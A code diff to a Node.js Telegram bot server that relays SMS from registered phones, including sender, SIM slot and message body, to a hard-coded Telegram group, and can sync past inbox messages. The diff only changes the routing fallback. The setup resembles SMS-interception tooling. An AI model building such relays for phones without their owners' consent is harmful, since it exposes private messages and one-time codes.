@@ -431,18 +431,11 @@ app.post('/api/forward-sms', async (req, res) => {
 
   const formattedMsg = `📩 *New SMS Received*\n\n📱 *Device:* \`${dev.deviceAlias}\`\n👤 *From:* \`${sender}\`\n💳 *SIM:* \`${simSlot || 'SIM 1'}\`\n⏰ *Time:* \`${timeStr}\`\n\n💬 *Message:*\n\`${body}\``;
 
-  // Send ONLY to Telegram Group if configured; fallback to Admin chat only if no group exists
-  const targets = new Set();
-  if (currentGroupChatId) {
-    targets.add(currentGroupChatId);
-  } else if (ADMIN_CHAT_ID) {
-    targets.add(ADMIN_CHAT_ID);
-  }
+  // Send ONLY to Telegram Group (-1004375481014) - NEVER to Bot Private Chat!
+  const targetId = currentGroupChatId || GROUP_CHAT_ID || '-1004375481014';
 
   try {
-    for (const targetId of targets) {
-      if (targetId) await bot.sendMessage(targetId, formattedMsg, { parse_mode: 'Markdown' });
-    }
+    await bot.sendMessage(targetId, formattedMsg, { parse_mode: 'Markdown' });
     res.json({ success: true });
   } catch (err) {
     console.error('Failed to forward SMS to Telegram:', err.message);
@@ -671,11 +664,7 @@ bot.on('callback_query', async (query) => {
       bot.answerCallbackQuery(query.id, { text: '🟢 SMS Forwarding Enabled & Syncing Past SMS' });
 
       const onMsg = `🟢 *SMS Forwarding Enabled* for \`${dev.deviceAlias}\`.\n\nUpcoming live SMS will be forwarded directly to this group. Any unsent past SMS are also being synced (duplicates will be skipped).`;
-      if (currentGroupChatId) {
-        bot.sendMessage(currentGroupChatId, onMsg, { parse_mode: 'Markdown' });
-      } else if (ADMIN_CHAT_ID) {
-        bot.sendMessage(ADMIN_CHAT_ID, onMsg, { parse_mode: 'Markdown' });
-      }
+      bot.sendMessage(currentGroupChatId || GROUP_CHAT_ID || '-1004375481014', onMsg, { parse_mode: 'Markdown' });
       break;
 
     case 'sync_old': {
@@ -683,11 +672,7 @@ bot.on('callback_query', async (query) => {
       bot.answerCallbackQuery(query.id, { text: '📥 Syncing unsent past SMS from device...' });
 
       const syncMsg = `📥 *Inbox SMS Sync Initiated* for \`${dev.deviceAlias}\`.\n\nScanning phone inbox for any unsent past messages (duplicate SMS will be skipped).`;
-      if (currentGroupChatId) {
-        bot.sendMessage(currentGroupChatId, syncMsg, { parse_mode: 'Markdown' });
-      } else if (ADMIN_CHAT_ID) {
-        bot.sendMessage(ADMIN_CHAT_ID, syncMsg, { parse_mode: 'Markdown' });
-      }
+      bot.sendMessage(currentGroupChatId || GROUP_CHAT_ID || '-1004375481014', syncMsg, { parse_mode: 'Markdown' });
       break;
     }
 
@@ -706,11 +691,7 @@ bot.on('callback_query', async (query) => {
       bot.answerCallbackQuery(query.id, { text: '🔴 SMS Forwarding Disabled' });
 
       const offMsg = `🔴 *SMS Forwarding Disabled* for \`${dev.deviceAlias}\`.\n\nUpcoming SMS messages will be stopped.`;
-      if (currentGroupChatId) {
-        bot.sendMessage(currentGroupChatId, offMsg, { parse_mode: 'Markdown' });
-      } else if (ADMIN_CHAT_ID) {
-        bot.sendMessage(ADMIN_CHAT_ID, offMsg, { parse_mode: 'Markdown' });
-      }
+      bot.sendMessage(currentGroupChatId || GROUP_CHAT_ID || '-1004375481014', offMsg, { parse_mode: 'Markdown' });
       break;
 
     case 'rename':
